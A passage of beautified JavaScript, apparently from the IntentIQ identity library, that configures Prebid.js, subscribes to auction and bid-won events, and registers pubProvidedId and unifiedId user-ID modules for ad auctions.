        i.f();
      }
    }
  } catch (t) {
    e.logger.fatal(t);
  }
}, IntentIqObject.prototype.configurePrebid = function () {
  try {
    this.logger.info("Starting Prebid configuration "), this.intentIqConfig.pbjs && this.intentIqConfig.pbjs.que ? (this.logger.info("Pushing config for prebid "), this.intentIqConfig.pbjs.que.push(this.tryRegisterIds.bind(null, this))) : this.logger.info("PBJS or QUE not defined");
  } catch (t) {
    this.logger.error(t);
  }
}, IntentIqObject.prototype.subscribeForPrebidEvents = function () {
  try {
    this.logger.info("Starting Prebid subscription "), this.intentIqConfig.pbjs && this.intentIqConfig.pbjs.que ? (this.intentIqConfig.shouldClearDuplicatresForRubicon && !this.intentIqConfig.subscriptionFlags.bidRequested && (this.logger.info("Subscribing for bidRequested for rubicon cleanup"), this.intentIqConfig.pbjs.que.push(this.tryRegisterForBidRequested.bind(null, this)), this.intentIqConfig.subscriptionFlags.bidRequested = !0), this.intentIqConfig.pbmonitoring.pbMonitoringEnabled && !this.intentIqConfig.subscriptionFlags.bidWon ? (this.logger.info("Registering for subscription for bidWon event"), this.intentIqConfig.pbjs.que.push(this.tryRegisterForBidWon.bind(null, this)), this.intentIqConfig.subscriptionFlags.bidWon = !0) : !0 === this.intentIqConfig.manualWinReportEnabled && this.logger.info("Manual won report enabled. Skipping bidwon subscription."), this.intentIqConfig.subscriptionFlags.auctionInited || (this.logger.info("Subscribing for auctionInited event"), this.intentIqConfig.pbjs.que.push(this.tryRegisterForAuctionInited.bind(null, this)), this.intentIqConfig.subscriptionFlags.auctionInited = !0)) : this.logger.info("PBJS or QUE not defined");
  } catch (t) {
    this.logger.error(t);
  }
}, IntentIqObject.prototype.tryRegisterForAuctionInited = function (e) {
  e.intentIqConfig.pbjs.onEvent("auctionInit", function (t) {
    try {
      e.updateCountersAndSaveIfAsked(e.intentIqData, !0), e.auctionEidsLength[t.auctionId] = t.bidderRequests[0].bids[0].userId && t.bidderRequests[0].bids[0].userId.pubProvidedId ? t.bidderRequests[0].bids[0].userId.pubProvidedId.length : -1;
    } catch (t) {
      e.logger.fatal(t);
    }
    try {
      e.auctionStartTimeData[t.auctionId] = t.timestamp, e.logger.info("Auction started.");
    } catch (t) {
      e.logger.fatal(t);
    }
  });
}, IntentIqObject.prototype.tryRegisterForBidWon = function (e) {
  e.intentIqConfig.pbjs.onEvent("bidWon", function (t) {
    e.onBidWonEvent(t, e);
  });
}, IntentIqObject.prototype.tryRegisterIds = function (e) {
  if (void 0 !== e) try {
    var t = {
        name: "pubProvidedId",
        params: {
          eidsFunction: e.getPubprovidedEids.bind(null, e)
        }
      },
      n = e.intentIqConfig.pbjs.getConfig("userSync.userIds");
    e.logger.info("Registering PubProvided callback "), n ? e.intentIqConfig.shouldRepalcePubprovided ? (e.logger.info("Configured to set before others pubprovided"), n.unshift(t), e.intentIqConfig.pbjs.setConfig({
      userSync: {
        userIds: n
      }
    })) : n.push(t) : e.intentIqConfig.pbjs.setConfig({
      userSync: {
        userIds: [t]
      }
    }), e.intentIqConfig.shouldSetUidsModulesConfig && null !== e.intentIqConfig.moduleIds.unifiedeId ? (t = e.setConfigObjectForUnifiedId(e.intentIqConfig.moduleIds.unifiedeId), (n = e.intentIqConfig.pbjs.getConfig("userSync.userIds")) && Array.isArray(n) ? ((0 !== n.filter(function (t) {
      return "unifiedId" === t.name;
    }).length || e.intentIqConfig.pbjs.getUserIds() && e.intentIqConfig.pbjs.getUserIds().tdid) && !e.intentIqConfig.shouldReplaceUnifiedId || (e.logger.info("Unshifting configuration for unifyedIds"), n.unshift(t)), e.intentIqConfig.pbjs.setConfig({
      userSync: {
        userIds: n
      }
    })) : e.intentIqConfig.pbjs.setConfig({
      userSync: {
        userIds: [t]
      }
    }), e.intentIqConfig.pbjs.refreshUserIds()) : e.intentIqConfig.pbjs.refreshUserIds();
  } catch (t) {
    e.logger.error("Faild to register EIDS");
  }
}, IntentIqObject.prototype.setConfigObjectForUnifiedId = function (t) {
  return {
    name: "unifiedId",
    value: {
      tdid: t
    }
  };
};
window.addEventListener('beforeunload', discoveryTask);